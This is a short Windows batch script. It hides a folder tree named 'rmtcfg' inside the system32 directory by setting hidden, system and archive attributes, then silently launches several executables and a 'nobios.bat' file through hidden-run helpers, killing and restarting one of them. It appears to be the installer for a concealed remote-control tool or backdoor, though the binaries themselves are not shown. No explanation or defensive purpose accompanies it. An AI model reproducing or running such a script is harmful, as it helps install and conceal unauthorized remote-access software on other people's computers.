@echo off

attrib +a +h +s c:\winnt\system32\rmtcfg
attrib +a +h +s c:\winnt\system32\rmtcfg\files
attrib +a +h +s c:\winnt\system32\rmtcfg\files\dat
attrib +a +h +s c:\winnt\system32\rmtcfg\files\plugin
attrib +a +h +s c:\winnt\system32\rmtcfg\files\log
attrib +a +h +s c:\winnt\system32\rmtcfg\files\copy

cd c:\winnt\system32\rmtcfg 
hiddenrun.exe rmtcfg.exe
hidden32.exe setup.exe rmtcfg.cfg 
hiddenrun.exe nobios.bat
cd c:\winnt\system32\rmtcfg\files
kill.exe mdll.exe
hiddenrun.exe mdll.exe